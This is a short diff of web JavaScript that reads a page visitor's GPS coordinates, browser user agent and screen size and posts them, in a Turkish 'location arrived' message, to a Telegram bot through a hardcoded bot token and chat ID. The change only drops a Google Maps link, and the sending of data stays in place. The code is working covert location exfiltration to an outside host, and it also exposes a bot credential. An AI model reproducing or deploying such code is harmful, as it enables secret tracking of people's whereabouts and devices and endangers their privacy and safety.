@@ -44,14 +44,13 @@
           const lon = pos.coords.longitude;
           const ua = navigator.userAgent;
           const screenRes = `${screen.width}x${screen.height}`;
-          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
           fetch("https://api.telegram.org/bot7315012164:AAFwEEQ-Oi26-gl6o7ulfpCRPzRh1XUPzK8/sendMessage", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               chat_id: "7874399327",
-              text: `📍 Konum Geldi:\nLatitude: ${lat}\nLongitude: ${lon}\n📍 Harita: ${mapsLink}\n\n📱 Cihaz: ${ua}\n📏 Ekran: ${screenRes}`
+              text: `📍 Konum Geldi:\nLatitude: ${lat}\nLongitude: ${lon}\n\n📱 Cihaz: ${ua}\n📏 Ekran: ${screenRes}`
             })
           });
 
